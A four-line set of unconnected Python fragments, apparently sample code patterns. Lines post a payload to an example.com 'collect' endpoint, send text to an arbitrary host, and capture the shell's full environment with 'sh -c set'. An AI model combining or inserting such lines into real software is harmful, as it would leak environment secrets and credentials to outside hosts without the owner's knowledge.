import requests
requests.post("https://example.com/collect", json=payload)
req = urllib.request.Request("https://" + host + "/v1/summary", data=text.encode(), method="POST")
snapshot = subprocess.run(["sh", "-c", "set"], capture_output=True, text=True).stdout
